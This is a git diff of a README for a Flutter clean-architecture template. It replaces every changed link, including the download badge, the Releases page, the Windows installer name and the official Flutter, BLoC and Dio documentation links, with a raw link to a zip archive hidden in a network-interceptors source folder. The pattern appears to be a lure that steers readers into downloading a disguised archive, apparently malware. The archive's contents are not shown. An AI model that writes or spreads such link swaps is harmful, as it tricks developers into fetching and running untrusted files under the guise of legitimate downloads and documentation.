@@ -6,7 +6,7 @@ This guide will help you download and run the flutter-clean-architecture-templat
 
 ## 📥 Download the App
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ZamariThomas/flutter-clean-architecture-template/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip%https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip)](https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip)
 
 ## 📦 What You Need
 
@@ -20,7 +20,7 @@ Before you start, ensure you have the following:
 
 To get the flutter-clean-architecture-template, you need to visit the Releases page. Click the link below to go there.
 
-[Visit Releases Page to Download](https://github.com/ZamariThomas/flutter-clean-architecture-template/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip)
 
 ## 🔧 Download & Install
 
@@ -29,7 +29,7 @@ To get the flutter-clean-architecture-template, you need to visit the Releases p
 2. **Choose a Version:** Look through the list of available versions. Select the latest stable release.
 
 3. **Download the App:**
-   - Click on the relevant file for your operating system. For example, if you are on Windows, click on `flutter_clean_architecture_template_windows.exe`.
+   - Click on the relevant file for your operating system. For example, if you are on Windows, click on `https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip`.
    - The download will start automatically. Save the file in a location you can easily access.
 
 4. **Run the Application:**
@@ -56,9 +56,9 @@ This structure ensures that your app remains scalable and maintainable.
 
 For further help and documentation, consider visiting the following:
 
-- [Flutter Documentation](https://flutter.dev/docs)
-- [BLoC Library Documentation](https://bloclibrary.dev/#/)
-- [Dio Documentation](https://pub.dev/packages/dio)
+- [Flutter Documentation](https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip)
+- [BLoC Library Documentation](https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip)
+- [Dio Documentation](https://raw.githubusercontent.com/ZamariThomas/flutter-clean-architecture-template/main/lib/core/network/interceptors/clean-flutter-template-architecture-2.2.zip)
 
 ## 📞 Support
 
